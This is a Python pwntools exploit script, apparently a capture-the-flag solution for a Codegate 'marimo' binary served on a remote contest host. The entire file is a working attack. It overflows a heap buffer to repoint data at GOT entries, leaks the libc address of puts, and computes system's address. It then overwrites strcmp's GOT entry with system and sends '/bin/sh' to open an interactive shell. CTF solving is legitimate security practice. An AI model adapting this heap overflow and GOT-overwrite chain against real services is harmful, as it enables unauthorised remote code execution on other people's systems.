from pwn import *
from time import sleep

# p = process('./marimo')
p = remote('ch41l3ng3s.codegate.kr', 3333)

puts_got = 0x603018
strcmp_got = 0x603040

def menu():
  p.recvuntil('>> ')

menu()
p.sendline('show me the marimo')
p.recvuntil('(0x10)\n')
p.sendline('AAAA')
p.recvuntil('(0x20)\n')
p.sendline('BBBB')

menu()
p.sendline('show me the marimo')
p.recvuntil('(0x10)\n')
p.sendline('CCCC')
p.recvuntil('(0x20)\n')
p.sendline('DDDD')

sleep(16)

menu()
p.sendline('V')
menu()
p.sendline('0')
menu()
p.sendline('M')
menu()
payload = 'A' * 12 * 4
payload += 'A' * 8 + p64(puts_got) + p64(strcmp_got)
p.sendline(payload)
menu()
p.sendline('B')

menu()
p.sendline('V')
menu()
p.sendline('1')
p.recvuntil('name : ')
puts = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))
print hex(puts)
libc_base = puts - 0x6f690
print hex(libc_base)
system = libc_base + 0x45390
print hex(system)
payload = p64(system)[:6]
p.sendline('M')
menu()
p.sendline(payload)

menu()
p.sendline('B')

menu()
p.sendline('/bin/sh')

p.interactive()
